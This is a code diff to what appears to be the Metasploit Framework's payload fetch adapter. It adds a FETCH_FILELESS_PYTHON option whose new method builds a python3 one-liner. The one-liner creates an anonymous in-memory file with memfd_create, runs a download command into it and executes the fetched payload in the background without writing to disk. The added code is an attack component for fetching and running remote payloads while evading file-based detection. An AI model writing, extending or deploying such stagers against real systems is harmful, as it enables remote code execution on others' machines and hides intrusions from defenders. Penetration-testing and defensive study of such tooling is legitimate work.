@@ -210,6 +210,8 @@ module Msf::Payload::Adapter::Fetch
 
   def _execute_nix(get_file_cmd)
     return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS']
+    return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS_PYTHON']
+
 
     cmds = get_file_cmd
     cmds << ";chmod +x #{_remote_destination_nix}"
@@ -232,6 +234,7 @@ module Msf::Payload::Adapter::Fetch
     end
     _execute_add(get_file_cmd)
   end
+  
 
   def _generate_first_stage_shellcode
     case module_info['AdaptedArch']
@@ -399,6 +402,11 @@ module Msf::Payload::Adapter::Fetch
     cmd << 'done;'
     cmd << 'fi;'
   end
+  
+  # same idea as _generate_fileless function, but force creating anonymous file handle
+  def _generate_fileless_python(get_file_cmd)
+    %Q<python3 -c 'import os, time; fd=os.memfd_create ("", os.MFD_CLOEXEC); os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\"; #{get_file_cmd}; $f &")'> 
+  end
 
   def _generate_curl_command
     case fetch_protocol
@@ -484,7 +492,7 @@ module Msf::Payload::Adapter::Fetch
   def _remote_destination_nix
     return @remote_destination_nix unless @remote_destination_nix.nil?
 
-    if datastore['FETCH_FILELESS']
+    if datastore['FETCH_FILELESS'] || datastore['FETCH_FILELESS_PYTHON']
       @remote_destination_nix = '$f'
       return @remote_destination_nix
     end
